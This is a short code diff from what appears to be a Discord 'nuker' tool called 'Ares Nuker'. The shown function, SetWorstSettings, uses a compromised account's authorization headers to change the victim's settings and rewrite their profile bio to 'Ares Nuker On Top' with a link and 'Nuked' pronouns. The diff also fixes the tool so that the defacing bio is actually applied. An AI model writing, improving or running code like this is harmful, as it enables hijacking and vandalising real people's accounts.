@@ -27,12 +27,13 @@ setting = {
           'status': "idle"
 }
 bio = {
-	'bio': '> Ares Nuker On Top :3\n> Made by _0xfc\n> Not public!'
+	'bio': '> Ares Nuker On Top :3\n> https://www.youtube.com/watch?v=sFUmPSyG61c ',
+     'pronouns': 'Nuked'
 }
 def SetWorstSettings() -> None:
 	try:
 		requests.patch("https://discord.com/api/v7/users/@me/settings", headers=headers_account, json=setting)
-		requests.patch("https://discord.com/api/v9/users/@me/profile", headers=headers_account, json=setting)
+		requests.patch("https://discord.com/api/v9/users/@me/profile", headers=headers_account, json=bio)
 		console.log('Set worst account settings')
 	except:
 		console.error('Unble set worst account settings')
